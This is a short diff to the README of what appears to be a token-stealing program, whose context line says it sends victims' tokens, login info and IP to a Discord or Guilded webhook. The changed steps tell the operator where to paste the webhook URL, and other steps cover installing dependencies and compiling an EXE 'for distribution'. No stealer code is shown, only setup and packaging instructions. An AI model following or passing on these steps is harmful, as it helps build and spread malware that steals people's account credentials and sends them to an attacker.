@@ -16,7 +16,7 @@ It will send a message in a webhook, with all the tokens, login info, ip and so 
    pip install pycryptodome
    ```
 3. Make a webhook in a discord server/guilded.gg server.
-4. Copy the webhook url into webhook.txt
+4. Paste the webhook url into the variable at line 29.
 5. Run the code or something.
 
 ## Compile for distribution (EXE)
@@ -25,7 +25,7 @@ It will send a message in a webhook, with all the tokens, login info, ip and so 
    pip install pyinstaller
    ```
 2. Make a webhook on discord or guilded and copy the url.
-3. Paste the webhook url into webhook.txt
+3. Paste the webhook url into the variable at line 29.
 4. Run the file "build.py"
 5. When its done, go into the "dist" directory and exe should be in there.
 
